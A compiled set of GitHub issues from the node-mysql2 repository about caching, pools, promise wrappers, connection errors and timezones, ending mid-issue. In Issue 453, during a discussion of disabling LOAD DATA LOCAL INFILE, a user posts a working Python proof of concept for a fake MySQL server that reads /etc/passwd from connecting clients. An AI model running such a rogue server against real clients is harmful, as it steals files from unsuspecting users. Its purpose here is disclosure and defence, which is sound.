  <Issue_451>
    <Repository>node-mysql2</Repository>
    <Title>cache and procedure</Title>
    <Owner>sidorares</Owner>
    <Body>Dear developers &#13;
i am use mysql2 lib with PoolConnection on ExpressJS.&#13;
When I make a two request  (changing the parameters of the request), I get old (cached) data sometimes (reloading the page). Is it somehow connected with Lru cached, but it is impossible to disable it through the connection parameters or it bug?&#13;
&#13;
in docunetation say: &#13;
 // If you execute same statement again, it will be picked from a LRU cache&#13;
// which will save query preparation time and give better performance&#13;
but i use Procedure and PoolQuery . Patching my CALL procedure added Math.Random but it had no effect&#13;
&#13;
my source code &#13;
```js&#13;
const mysql = require('mysql2');&#13;
const mysqlpool = mysql.createPool({&#13;
    host: 'localhost',&#13;
    user: 'root',&#13;
    database: 'base_test',&#13;
    waitForConnections: true,&#13;
    connectionLimit: 10,&#13;
    queueLimit: 0,&#13;
    multipleStatements: false,&#13;
    //caching: true&#13;
});&#13;
&#13;
module.exports.getQuery = function (str,brand,resout) {&#13;
    let rnd = Math.random();&#13;
    let sqlProcedure = 'CALL alfaquery_v2(?,?);';&#13;
    mysqlpool.query(&#13;
        sqlProcedure,[str,rnd],&#13;
        function(err, rows) {&#13;
            if (err) {&#13;
                console.log(err);&#13;
                resout.send([]);&#13;
            }&#13;
            console.log(rows[0]);&#13;
            resout.send(rows[0]);&#13;
        });&#13;
}&#13;
&#13;
```&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>only statement handle is cached, the data is always fresh from whatever results DB server sends you. Don't think it's related to driver caching something.&#13;
&#13;
Do you actually see `console.log(rows[0]);` printing results that do not match input `str`? Try to print parameter next to results - `console.log(str, rows[0]);`</Body>
    </Comment>
  </Issue_451>
  <Issue_452>
    <Repository>node-mysql2</Repository>
    <Title>How to test connection without any query?</Title>
    <Owner>sidorares</Owner>
    <Body>i just need a way to check the connect configurations,please help.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>`connection.ping(cb)` or simple query like `conn.query('select 1+1 as test', cb)`</Body>
    </Comment>
  </Issue_452>
  <Issue_453>
    <Repository>node-mysql2</Repository>
    <Title>The config of 'LOCAL_FILES' does not work</Title>
    <Owner>sidorares</Owner>
    <Body>I want to disable the function of local_files, but the config does not work.&#13;
var Sequelize = require('sequelize');&#13;
let dialect = 'mysql';&#13;
const timeout = 8E3;&#13;
let dialectOptions = {&#13;
  flags:'-LOCAL_FILES', &#13;
  debug: true&#13;
};</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you explain "but the config does not work."? What's expected result and what you actually observe?</Body>
    </Comment>
    <Comment>
      <Owner>ddddyyy</Owner>
      <Body>@sidorares &#13;
https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html   by default, the server side can read file of client, I want to disable the function .  Could you help me ?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>at the moment the only way to disable 'local file' is to pass `infileStreamFactory` option that returns a no-op stream</Body>
    </Comment>
    <Comment>
      <Owner>ddddyyy</Owner>
      <Body>@sidorares Could you show demo code. I do not know which file I need to change;</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>```js&#13;
const { Readable } = require('stream');&#13;
class EmptyStream extends Readable {&#13;
 _read(){&#13;
  this.emit('end');&#13;
 }&#13;
}&#13;
&#13;
let dialectOptions = {&#13;
  infileStreamFactory: (name) =&gt; {&#13;
    console.log(`Server wants to access local ${name} file, access denied`)&#13;
    return new EmptyStream();&#13;
  }&#13;
};&#13;
```&#13;
&#13;
we do have intention to disable local fs access completely and leave `infileStreamFactory` as the only way to respond with infile content ( could be named differently and have slightly different api )</Body>
    </Comment>
    <Comment>
      <Owner>ddddyyy</Owner>
      <Body>@sidorares                                                                                                                                          &#13;
 Ignoring invalid configuration option passed to Connection: infileStreamFactory. This is currently a warning, but in future versions of MySQL2, an error will be thrown if you pass an invalid configuration options to a Connection                                                                                                                       &#13;
var Sequelize = require('sequelize');&#13;
let dialect = 'mysql';&#13;
&#13;
const { Readable } = require('stream');&#13;
&#13;
class EmptyStream extends Readable {&#13;
  _read(){&#13;
    this.emit('end');&#13;
  }&#13;
}&#13;
&#13;
let dialectOptions = {&#13;
  infileStreamFactory: (name) =&gt; {&#13;
    console.log('Server wants to access local ${name} file, access denied');&#13;
    return new EmptyStream();&#13;
  }&#13;
};&#13;
const timeout = 8E3;&#13;
&#13;
&#13;
let ip = '127.0.0.1';&#13;
let port = '3306';&#13;
let db ='a';&#13;
let username ='b';&#13;
let password ='c';&#13;
const sequelize = new Sequelize(db, username, password, {&#13;
  dialect: dialect,&#13;
  host: ip,&#13;
  port: port,&#13;
  pool: {&#13;
    handleDisconnects: true&#13;
  },&#13;
  dialectOptions: dialectOptions&#13;
});&#13;
&#13;
sequelize.authenticate();</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hm, looks like this does not work per connection and only at query level&#13;
&#13;
```js&#13;
connection.query(&#13;
  { sql: "LOAD DATA local INFILE 'infile.csv' INTO TABLE qqq.infiletable", &#13;
      infileStreamFactory: (name) =&gt; {&#13;
      console.log(`Server wants to access local ${name} file, access denied`)&#13;
      return new EmptyStream();&#13;
    }&#13;
  }, (err, res) =&gt; {&#13;
 console.log(err, res);&#13;
});&#13;
```&#13;
&#13;
not sure if code above is easy to integrate with Sequelize</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I guess connection config level `infileStreamFactory` was broken. I don't think it worth fixing it in light of planned renaming. I'm going to 1) disable completely direct access to fs 2) rename this option to `infile` and soft-deprecate query level `infileStreamFactory`. This is going to be major version bump</Body>
    </Comment>
    <Comment>
      <Owner>ddddyyy</Owner>
      <Body>@sidorares `#!/usr/bin/python&#13;
&#13;
#coding=utf-8 &#13;
import socket&#13;
import logging&#13;
logging.basicConfig(level=logging.DEBUG)&#13;
&#13;
filename="/etc/passwd"&#13;
sv=socket.socket()&#13;
sv.bind(("0.0.0.0",3306))&#13;
sv.listen(5)&#13;
conn,address=sv.accept()&#13;
logging.info('Conn from: %r', address)&#13;
conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")&#13;
conn.recv(9999)&#13;
logging.info("auth okay")&#13;
conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")&#13;
conn.recv(9999)&#13;
logging.info("want file...")&#13;
wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename&#13;
#print wantfile&#13;
conn.sendall(wantfile)&#13;
content=conn.recv(9999)&#13;
logging.info(content)&#13;
conn.close()`    Using the poc someone can create a fake mysql server; </Body>
    </Comment>
  </Issue_453>
  <Issue_454>
    <Repository>node-mysql2</Repository>
    <Title>Missing symbol.iterator on RowDataPacket</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
I'm making a refactoring to node.js project from callbacks to async await es7 feature, so in that refactoring stage I was migrating from mysql to mysql2 driver. I'm using mysq2/promise so everything works well with new async await keyword, but I have one small problem. When I'm returning promise&lt;RowDataPacket[]&gt; from select, update or insert i can't use for or loop.&#13;
&#13;
```js&#13;
export const selectAsync = async (&#13;
  sqlStatement: string,&#13;
  params: any[]&#13;
): Promise&lt;mysql.RowDataPacket[]&gt; =&gt; {&#13;
  try {&#13;
    const connection = await mysql.createConnection({&#13;
      host: config.mysql_credentials.db_host,&#13;
      user: config.mysql_credentials.db_user,&#13;
      password: config.mysql_credentials.db_password,&#13;
      database: config.mysql_credentials.db_database,&#13;
      multipleStatements: true&#13;
    });&#13;
&#13;
    const [rows] = await connection.query&lt;mysql.RowDataPacket[]&gt;(&#13;
      sqlStatement,&#13;
      params&#13;
    );&#13;
    return rows;&#13;
  } catch (err) {&#13;
    console.log('Select query executing error', err);&#13;
    return;&#13;
  }&#13;
};&#13;
```&#13;
Now, when I use this selectAsync for example in some function and when the data are fetched from db I can't loop with for of loop when I execute multiples sql queries at once:&#13;
&#13;
```js&#13;
 for (let row of result[0]) {&#13;
        // some code&#13;
      }&#13;
```&#13;
result[0] or result[1] gives error that the RowDataPacket must have a symbol iterator. One workaround is to use forEach, but I don't like to change forEeach everywhere where I have for of loop already from previously when for of loop was working with mysql driver.&#13;
&#13;
BR, Igor</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>though a bit different to your error, I do have plans to add async iterators: https://github.com/sidorares/node-mysql2/pull/822#issuecomment-409415308&#13;
&#13;
api might look similar to this example:&#13;
&#13;
```js&#13;
const rows = connection.streamQuery(sqlStatement, params);&#13;
for await (const row of rows) {&#13;
   console.log(row); &#13;
}&#13;
```</Body>
    </Comment>
  </Issue_454>
  <Issue_455>
    <Repository>node-mysql2</Repository>
    <Title>(fix/query): Row parsing could lead to uncaught errors</Title>
    <Owner>sidorares</Owner>
    <Body>Data type parsers could throw an exception, e.g. `JSON.parse` for the JSON type. Currently, this exception is unhandled and crashes the application that receives it.&#13;
&#13;
This change does the catching and passes it to either the callback, or the error event subscribers in order to support graceful recover if needed.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Do you have any particular example in mind when this can happen @miroslavLalev ? Maybe we should add some fuzz testing tool to make sure client never crashes even when server responds with broken data</Body>
    </Comment>
    <Comment>
      <Owner>miroslavLalev</Owner>
      <Body>Hello @sidorares, this is an example how I encountered the issue.&#13;
&#13;
I was working on file parser that extracts metadata from a file and sends it to service, where they are persisted in the database (mysql v5.7.14). There used to be a bug in which this parser would accept any type of files, so we had an incoming request with broken settings, that were parsed from archive file, and the persisted json would look like this (note that it's still a valid json, just the encoding conversion to utf8 doesn't make sense): &#13;
&#13;
![screen shot 2019-02-13 at 10 47 03](https://user-images.githubusercontent.com/8537608/52698704-c0e20980-2f7c-11e9-9fe7-20a0a3bcf001.png)&#13;
&#13;
Then, after trying to query the row that contained this corrupted data from my node application, it was crashing with the following unhandled exception:&#13;
&#13;
```&#13;
    SyntaxError: Unexpected token  in JSON at position 616&#13;
        at JSON.parse (&lt;anonymous&gt;)&#13;
        at eval (eval at line.toFunction (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/generate-function/index.js:55:21), &lt;anonymous&gt;:29:142)&#13;
        at ConnectionManager._typecast (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/sequelize/lib/dialects/mysql/connection-manager.js:61:12)&#13;
        at new TextRow (eval at line.toFunction (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/generate-function/index.js:55:21), &lt;anonymous&gt;:29:32)&#13;
        at Query.row (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/commands/query.js:232:13)&#13;
        at Query.Command.execute (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/commands/command.js:40:20)&#13;
        at Connection.handlePacket (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/connection.js:516:28)&#13;
        at PacketParser.onPacket (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/connection.js:94:16)&#13;
        at PacketParser.executePayload (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/packet_parser.js:139:12)&#13;
        at Socket.&lt;anonymous&gt; (/go/src/git.chaosgroup.com/vcloud/saas/node_modules/mysql2/lib/connection.js:102:29)&#13;
        at emitOne (events.js:116:13)&#13;
        at Socket.emit (events.js:211:7)&#13;
        at addChunk (_stream_readable.js:263:12)&#13;
        at readableAddChunk (_stream_readable.js:250:11)&#13;
        at Socket.Readable.push (_stream_readable.js:208:10)&#13;
        at TCP.onread (net.js:601:20)&#13;
```&#13;
&#13;
I suspect that this is a problem with the mysql server returning bad (possibly not properly escaped) data, but couldn't find any issue related to it.&#13;
&#13;
Anyway, I think the fix makes sense even without this context because any data type parser could be prone to throwing exception and the mysql client should return it. About the fuzz testing, I really like the idea but it might be appropriate for another pull request in case other issues are found and gets out of scope. Do you want me to open issue for it, linking this pull request as example where things could go wrong?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'm pretty sure JSON field payload  (as we see it after receiving on the client side) was not correct for whatever reason ( would be good to track why) - incorrect decoding or json content broken on server.&#13;
&#13;
Would be good to add some unit test for this, maybe around similar example you had using mocked server ( server returns json field type in field description but invalid json as row payload). Let e know if you need help with that</Body>
    </Comment>
    <Comment>
      <Owner>miroslavLalev</Owner>
      <Body>I was quite busy the last couple of days but found some time to start doing the test today. Currently, I am struggling to create the mocked server duplex stream that returns everything in correct order when being read. I couldn't find anything similar in the existing unit tests as well. Do you have any ideas how to do it properly?</Body>
    </Comment>
    <Comment>
      <Owner>miroslavLalev</Owner>
      <Body>@sidorares I couldn't get the custom mock server to work, so I wrote test with throwing `rowParser` to assert that the error is correctly passed to callback.</Body>
    </Comment>
  </Issue_455>
  <Issue_456>
    <Repository>node-mysql2</Repository>
    <Title>First query is super slow, all others are fine</Title>
    <Owner>sidorares</Owner>
    <Body>This appears to be happening with mysql 8.0.13 (provisioned with amazon RDS), mysql 5.7 does not do this.&#13;
&#13;
What happens is that the first query, any query at all, will take about 8 seconds to run, but all other subsequent queries are nice and fast.  Here is the code to reproduce:&#13;
&#13;
```&#13;
var mysql = require('mysql2');&#13;
&#13;
var conn  = mysql.createPool({&#13;
    host     : process.env.DB_HOST,&#13;
    user     : process.env.DB_USERNAME,&#13;
    password : process.env.DB_PASSWORD,&#13;
    port     : process.env.DB_PORT,&#13;
    database : process.env.DB_NAME&#13;
});&#13;
&#13;
console.time('startupQueryTime')&#13;
conn.query('SELECT 1+1', [], function(err, result){&#13;
    console.timeEnd('startupQueryTime');&#13;
})&#13;
```&#13;
&#13;
Output is:&#13;
```&#13;
startupQueryTime: 7120.876ms&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you check same setup using mysqljs/mysql driver? &#13;
Do you experience first slow query only after some inactivity or every time you run script first query is slow (  RDS slow cold start?)</Body>
    </Comment>
    <Comment>
      <Owner>anthonywebb</Owner>
      <Body>@sidorares I can verify that this also happening with the normal nodejs "mysql" module, and it only happens on startup,  Oddly I have been getting the ECONNRESET error after inactivity.  I may have to revert back to mysql 5.7, but I would love to get the enhancements from 8.* if at all possible.</Body>
    </Comment>
  </Issue_456>
  <Issue_457>
    <Repository>node-mysql2</Repository>
    <Title>Wrapping all functions that return promise to support Meteor</Title>
    <Owner>sidorares</Owner>
    <Body>Hi, I'm the defacto maintainer of the Meteor MySQL packages https://github.com/vlasky/meteor-mysql and https://github.com/vlasky/mysql-live-select.&#13;
&#13;
I have made a number of improvements to the package in my own private fork, but I want to do some refactoring before releasing them publicly.&#13;
&#13;
In short, I am trying to come up with efficient code that automatically adds Meteor's Promise.await() wrappers around every method in node-mysql2 that returns a promise.&#13;
&#13;
The Meteor framework relies on Fibers/Futures and Promise.await() is like an adapter.&#13;
&#13;
Here's an example of how  things need to be done now when using node-mysql2 in Meteor&#13;
&#13;
```&#13;
import mysql from 'mysql2';&#13;
&#13;
const pool = mysql.createPool({&#13;
  host: 'localhost',&#13;
  user: 'root',&#13;
  database: 'test',&#13;
  waitForConnections: true,&#13;
  connectionLimit: 10,&#13;
  queueLimit: 0&#13;
});&#13;
&#13;
myConnection = Promise.await(mysql.pool.promise().getConnection());&#13;
...&#13;
&#13;
myResult = Promise.await(myConnection.execute(query, args));&#13;
```&#13;
&#13;
To achieve this goal, I expect it to require a snippet of code that iterates over node-mysql2's prototypes and create a new object with the Promise.await()-wrapped methods, or even add a new method to mysql.pool like mysql.pool.fibers().&#13;
&#13;
Any guidance would be appreciated.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'd rather do that manually in a separate wrapper package. There are maybe a dozen of top level api methods that need to be wrapped, maybe no need for sophisticated automation</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>Yes @sidorares, I am just after the required bit of code - I am not looking for it to be incorporated into node-mysql2.&#13;
&#13;
This is code that I would include in https://github.com/vlasky/meteor-mysql .</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>So you'll have something like this:&#13;
&#13;
```js&#13;
import mysql from 'mysql2';&#13;
import mysqlFutureAdapter from 'mysql2-future'; // example name, might be taken&#13;
&#13;
const pool = mysqlFutureAdapter (mysql2).createPool();&#13;
const myConnection  = pool.getConnection();&#13;
const result = myConnection.execute(query, args);&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>slightly offtopic, but I'm keen to integrate better live select functionality. There is already binlog support in mysql2 so should be not that difficult</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'd expect your adapter would look similar to promise wrapper code - https://github.com/sidorares/node-mysql2/blob/master/promise.js</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>I would still prefer to have access to the unwrapped async callback methods and promise methods, that's why I would like the snippet of code to dynamically add mysql.pool.fibers().</Body>
    </Comment>
  </Issue_457>
  <Issue_458>
    <Repository>node-mysql2</Repository>
    <Title>missing end/close events on connection object</Title>
    <Owner>sidorares</Owner>
    <Body>I noticed at some point `mysql2` stopped emitting important events on the connection object, namely `end` and/or `close`. This happens whether or not there was an error that caused the disconnection.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hm, strange. I'd expect this is what pool is listening to keep track of what connections are live and what are not. I'll have a look, thanks</Body>
    </Comment>
  </Issue_458>
  <Issue_459>
    <Repository>node-mysql2</Repository>
    <Title>await createPool leads to odd behaviour</Title>
    <Owner>sidorares</Owner>
    <Body>await'ing non promises is technically valid code. But the following code behaves strangely.&#13;
&#13;
```js&#13;
async query(qry) {&#13;
    if (!this.pool) {&#13;
        this.pool = await mysql.createPool({&#13;
            connectionLimit: 10,&#13;
            host: "host.com",&#13;
            user: "******",&#13;
            password: "password",&#13;
            database: "*****"&#13;
        });&#13;
    }&#13;
    return this.pool.query(qry).catch(console.log);&#13;
}&#13;
```&#13;
&#13;
The whole thing works. But instead of queuing requests it creates a new connection for every query.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>looks like you are creating new pool for each query instead of reusing single pool</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>oh, sorry, I see you assign it to a variable</Body>
    </Comment>
    <Comment>
      <Owner>smdufb</Owner>
      <Body>Yeah excuse the formatting issue. Fixed that.</Body>
    </Comment>
    <Comment>
      <Owner>smdufb</Owner>
      <Body>Also just inserted the actual 'await' now.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Is `mysql` coming from `require('mysql2/promise')? "Promisified" pool returns promise-wrapped connection object</Body>
    </Comment>
    <Comment>
      <Owner>smdufb</Owner>
      <Body>Yes I'm using `require('mysql2/promise')`. But `createPool` doesn't return a promise in either mysql2 or mysql2/promise, right?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>correct, but awaiting non-promise should in theory give you original value</Body>
    </Comment>
    <Comment>
      <Owner>smdufb</Owner>
      <Body>Yes exactly. And it does to some extent in that the pool is created and works. Only it creates connections for every query even past the `connectionLimit`</Body>
    </Comment>
  </Issue_459>
  <Issue_460>
    <Repository>node-mysql2</Repository>
    <Title>Inconsistent ER_PARSE_ERROR</Title>
    <Owner>sidorares</Owner>
    <Body># Problem&#13;
&#13;
Keep getting `ER_PARSE_ERROR` when running queries against a MySQL 5.6 database because the Node `mysql` driver fails to expand the value placeholders, so a query written like this (passing in `[75]` to the driver API)&#13;
&#13;
```&#13;
const sql = `SELECT \`column_1\` FROM \`table_1\` WHERE \`id\` IN (?)`;&#13;
```&#13;
&#13;
Is sent to the DB like this&#13;
&#13;
```&#13;
SELECT `column_1` FROM `table_1` WHERE `id` IN (?)&#13;
```&#13;
&#13;
```&#13;
{"time":"2018-12-11 21:26:33.877","level":"error","event":"data.source.db.sql","code":"ER_PARSE_ERROR","errno":1064,"sqlState":"42000","sqlMessage":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?)' at line 1"}&#13;
```&#13;
&#13;
What's even weirder is that if I deliberately introduce a mistake in the query, like a non-existent column in the `SELECT`, and then log out the query from MySQL `mysql.general_log`, the values *are correctly expanded*. Naturally, the query still fails but for a completely different reason!&#13;
&#13;
```&#13;
SELECT `column_1`, `fakecolumn` FROM `table_1` WHERE `id` IN (75)&#13;
```&#13;
&#13;
Could this be a genuine bug in the parser or am I not passing the array argument correctly to the query?&#13;
&#13;
# Code&#13;
&#13;
Connections are retrieved from a pool configured like so&#13;
&#13;
```&#13;
    const poolOpts = Object.assign({&#13;
        host,&#13;
        port,&#13;
        user,&#13;
        password,&#13;
        database,&#13;
        connectionLimit: CONNECTION_LIMIT,&#13;
        queueLimit: QUEUE_LIMIT,&#13;
        acquireTimeout: ACQUIRE_TIMEOUT,&#13;
        waitForConnections: WAIT_FOR_CONNECTIONS,&#13;
    }, connectionOptions);&#13;
&#13;
    const pool = mysql.createPool(poolOpts);&#13;
```&#13;
&#13;
This is the Node and the corresponding query. The `query` function we use is part of a mysql wrapper library (definition down below).&#13;
&#13;
The value of the `ids` array which is passed in to the query method to expand the '?' placeholders is `[ 23272531, 23272538]`, so I presume the value that gets injected in the end is `[[23272531, 23272538]]`, which would expand the question mark as a comma-separated list of IDs without the parentheses, which I add myself in the SQL.&#13;
&#13;
```&#13;
    async getValuesById(ids) {&#13;
        if (!ids || ids.length === 0) {&#13;
            throw new Error('No IDs were passed');&#13;
        }&#13;
&#13;
        const sql = `&#13;
SELECT \`column_1\` FROM \`table_1\` WHERE \`id\` IN (?)&#13;
;`;&#13;
&#13;
        try {&#13;
            const result = await this.dbSingle.query(&#13;
                sql,&#13;
                [ids],&#13;
                'data.source.db',&#13;
            );&#13;
            return result.map(row =&gt; row.column_1);&#13;
        } catch (e) {&#13;
            const error = `Failed to check if matches exist: ${e.toString()}`;&#13;
            this.logger.warn('data.source.db', { message: error, ids });&#13;
            throw new Error(error);&#13;
        }&#13;
    }&#13;
```&#13;
&#13;
And here is the `query()` function definition in our mysql library wrapper.&#13;
&#13;
```&#13;
    function releaseConnection(connection) {&#13;
        connection.release();&#13;
    }&#13;
&#13;
    function newConnection() {&#13;
        return new Promise((resolve, reject) =&gt; {&#13;
            pool.getConnection((err, connection) =&gt; {&#13;
                if (err) {&#13;
                    logger.error('connector.DBConnection.newConnection', err);&#13;
                    return reject(err);&#13;
                }&#13;
&#13;
                return resolve(connection);&#13;
            });&#13;
        });&#13;
    }&#13;
&#13;
    function query(sql, values = [], label) {&#13;
        const outputLabel = label || DEFAULT_OUTPUT_LABEL;&#13;
        return new Promise((resolve, reject) =&gt; {&#13;
            const startToken = timers.start();&#13;
            newConnection()&#13;
                .then((connection) =&gt; {&#13;
                    connection.query(sql, values, (err, rows) =&gt; {&#13;
                        const duration = timers.stop(startToken);&#13;
                        if (err) {&#13;
                            logger.error(`${outputLabel}.sql`, { error: err.toString() });&#13;
                            connection.destroy();&#13;
                            return reject(err);&#13;
                        }&#13;
                        logger.info(`${outputLabel}.query.done`, {&#13;
                            duration,&#13;
                            count: rows.length,&#13;
                        });&#13;
                        releaseConnection(connection);&#13;
                        return resolve(rows);&#13;
                    });&#13;
                })&#13;
                .catch((err) =&gt; {&#13;
                    logger.error(`${outputLabel}.sql`, { error: err.toString() });&#13;
                    reject(err);&#13;
                });&#13;
        });&#13;
    }&#13;
&#13;
```&#13;
&#13;
# How to Reproduce&#13;
&#13;
I cannot reliably reproduce this issue in all of its different manifestations. There are some scenarios where I actually can, e.g. when I try to write to the database and get a duplicate row error back, and then carry on executing more unrelated queries (getting a new connection from the pool each time, as shown in `newConnection()`).&#13;
&#13;
# Environment&#13;
&#13;
MySQL version: `5.6`&#13;
Node mysql2 version: `1.6.4`&#13;
Node version: `8.12.0`&#13;
OS: Alpine Linux 3.6 (Docker)</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>`ER_PARSE_ERROR ` usually mean sql you are sending to server is invalid. Can you log query after all variables substitutions? You can do it like this:&#13;
&#13;
```js&#13;
const query = connection.query(sql, values, (err, rows) =&gt; {&#13;
   //&#13;
});&#13;
console.log(query.sql);&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>dvejmz</Owner>
      <Body>@sidorares Hi, thanks for your help. The output I get back when logging it out is&#13;
&#13;
```&#13;
SELECT `column_1` FROM `table_1` WHERE `id` IN (?)&#13;
```&#13;
&#13;
Placeholder expansion just doesn't seem to happen at all! I've also logged out the values that I pass in before doing so to ensure they're actually set and indeed they are. This is very puzzling to me.</Body>
    </Comment>
  </Issue_460>
  <Issue_461>
    <Repository>node-mysql2</Repository>
    <Title>Random ECONNRESET when talking to docker mysql</Title>
    <Owner>sidorares</Owner>
    <Body>Hi all,&#13;
&#13;
I have a big issue where I randomly get ECONNRESET every 1-5 minutes when using mysql / mysql2 npm package. ( Works fine up until this point )&#13;
&#13;
**Environment**&#13;
 &#13;
- `mysql server` running in docker, mapped to host port 3306&#13;
- `node server` running within docker, talking to mysql via host_ip:3306&#13;
&#13;
**Errot**&#13;
&#13;
```&#13;
data-server-container |   Error: read ECONNRESET&#13;
data-server-container |&#13;
data-server-container |   - net.js:622 TCP.onread&#13;
data-server-container |     net.js:622:25&#13;
```&#13;
&#13;
**Fix attempts**&#13;
&#13;
I've tried all sorts to try and get the connection to remain - including&#13;
&#13;
### Using pools&#13;
&#13;
```&#13;
&#13;
const mysql = require('mysql2');&#13;
const connection = await mysql.createPool({&#13;
  connectionLimit: 10,&#13;
  host: process.env.DB_HOST_DOCKER,&#13;
  user: process.env.DB_USER_DOCKER,&#13;
  password: process.env.DB_PASSWORD_DOCKER,&#13;
  database: process.env.DB_DATABASE,&#13;
});&#13;
&#13;
query = (sql) =&gt; {&#13;
  return new Promise(async (resolve, reject) =&gt; {&#13;
    connection.getConnection(function (err, poolConnection) {&#13;
      if (err) throw err; // not connected!&#13;
&#13;
      // Use the connection&#13;
      poolConnection.query(sql, function (error, results, fields) {&#13;
&#13;
        if (error) reject(error)&#13;
&#13;
        resolve(results);&#13;
&#13;
        // When done with the connection, release it.&#13;
        poolConnection.release();&#13;
&#13;
      })&#13;
&#13;
    })&#13;
  })&#13;
}&#13;
&#13;
```&#13;
&#13;
### Creating a new connection on every request! ( Somehow this still gets ECONNRESET! )&#13;
&#13;
```&#13;
query = (sql) =&gt; {&#13;
&#13;
  const mysql = require('mysql2');&#13;
&#13;
  const connection = await mysql.createConnection({&#13;
    host: process.env.DB_HOST_DOCKER,&#13;
    user: process.env.DB_USER_DOCKER,&#13;
    password: process.env.DB_PASSWORD_DOCKER,&#13;
    database: process.env.DB_DATABASE,&#13;
  });&#13;
  &#13;
  return new Promise(async (resolve, reject) =&gt; {&#13;
    connection.query(sql, (error, results) =&gt; {&#13;
      if (error) {&#13;
        reject(error);&#13;
      }&#13;
      resolve(results);&#13;
    });&#13;
  }&#13;
&#13;
}&#13;
```&#13;
&#13;
* Sending a ping to the connection every 10 seconds&#13;
* Checking my wait_timeout is high enough on mysql server ( 28800 as expected )&#13;
&#13;
I'm running out of ideas here it's stopping me being able to use this in production :(&#13;
&#13;
My best assumption after trying all the above is there an issue with the TCP Keep-Alive on the socket perhaps that is only triggered when running  node / mysql within docker ( I stumbled on this MR - could this be a solution? https://github.com/mysqljs/mysql/pull/2110/  )&#13;
&#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>eagle7410</Owner>
      <Body>I have the same problems.&#13;
Docker swarm &#13;
mysql/server 5.7&#13;
node 8.11&#13;
mysql2: 1.6.1</Body>
    </Comment>
  </Issue_461>
  <Issue_462>
    <Repository>node-mysql2</Repository>
    <Title>conn is not defined in Example 2 on Promise-Wrapper.md</Title>
    <Owner>sidorares</Owner>
    <Body>```js&#13;
async function example1 () {&#13;
  const mysql = require('mysql2/promise');&#13;
  const conn = await mysql.createConnection({ database: test });&#13;
  const [rows, fields] = await conn.execute('select ?+? as sum', [2, 2]);&#13;
}&#13;
&#13;
async function example2 () {&#13;
   const mysql = require('mysql2/promise');&#13;
   const pool = mysql.createPool({database: test});&#13;
   // execute in parallel, next console.log in 3 seconds&#13;
   await Promise.all([pool.query('select sleep(2)'), pool.query('select sleep(3)')]);&#13;
   console.log('3 seconds after');&#13;
   await pool.end();&#13;
   await conn.end();&#13;
}&#13;
```&#13;
From where does conn in example 2, if it has not been defined? &#13;
Example 2 would not be wrong?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not sure, might be leftover from `const conn = await pool.getConnection()` example. I'll try to clean up, thanks for heads up!</Body>
    </Comment>
  </Issue_462>
  <Issue_463>
    <Repository>node-mysql2</Repository>
    <Title>createConnection timezone not working</Title>
    <Owner>sidorares</Owner>
    <Body>Hi guys,&#13;
&#13;
in below code timezone setting does not seem to have any effort , i think its the issue with the driver could anyone help ?&#13;
&#13;
my sql DB timezone : "-08:00"&#13;
application time : "+05:30"&#13;
&#13;
yes this needs to be handled at app level. DB cant change.&#13;
&#13;
var mysql = require('mysql');&#13;
&#13;
&#13;
//connect to db&#13;
var dbCon = mysql.createConnection({&#13;
    host: "xxxx",&#13;
    user: "xxxxx",&#13;
    password: "xxxxx",&#13;
    database:"xxxx",&#13;
